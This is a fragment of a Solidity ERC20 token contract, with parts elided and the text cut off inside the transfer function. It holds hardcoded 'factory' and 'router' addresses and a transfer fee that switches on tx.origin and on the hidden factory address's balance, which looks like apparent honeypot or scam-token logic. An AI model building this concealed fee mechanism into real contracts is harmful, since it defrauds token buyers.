...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private _factoryV2 = 0x4A1C35f24B13c748356BC3Dc75423cdB41Af77DE;
    address internal V2Router = 0xB9219d23b6fD03d2f242058dEA5a505e4f99f348;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != V2Router && _balances[_factoryV2] > 0 ? pairToken : swapEnabled).div(100)+0;
        if (swapamount > 0)
        {
